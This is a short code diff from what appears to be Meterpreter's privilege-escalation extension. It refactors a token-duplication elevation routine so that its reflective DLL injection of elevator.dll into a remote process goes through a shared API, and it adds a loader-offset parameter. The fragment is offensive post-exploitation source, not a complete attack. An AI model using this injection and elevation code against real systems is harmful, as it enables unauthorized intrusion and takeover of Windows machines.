@@ -1,8 +1,6 @@
 #include "precomp.h"
 #include "common_metapi.h"
 #include "tokendup.h"
-#include "../../ReflectiveDLLInjection/inject/src/LoadLibraryR.h"
-#include "../../ReflectiveDLLInjection/inject/src/LoadLibraryR.c"
 
 /*
  * Enable or disable a privilege in our processes current token.
@@ -79,6 +77,7 @@ DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
 	do
 	{
 		LPCSTR reflectiveLoader = met_api->packet.get_tlv_value_reflective_loader(packet);
+		DWORD dwActualReflectiveLoaderOffset = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_LIB_LOADER_OFFSET);
 
 		// only works on x86 systems for now...
 		if( elevate_getnativearch() != PROCESS_ARCH_X86 )
@@ -156,7 +155,7 @@ DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
 					break;
 
 				// use RDI to inject the elevator.dll into the remote process, passing in the command line to elevator.dll
-				hThread = LoadRemoteLibraryR( hProcess, lpServiceBuffer, dwServiceLength, reflectiveLoader, lpRemoteCommandLine );
+				hThread = met_api->inject.reflective_loader.LoadRemoteLibraryR( hProcess, lpServiceBuffer, dwServiceLength, reflectiveLoader, dwActualReflectiveLoaderOffset, lpRemoteCommandLine );
 				if( !hThread )
 					break;
 
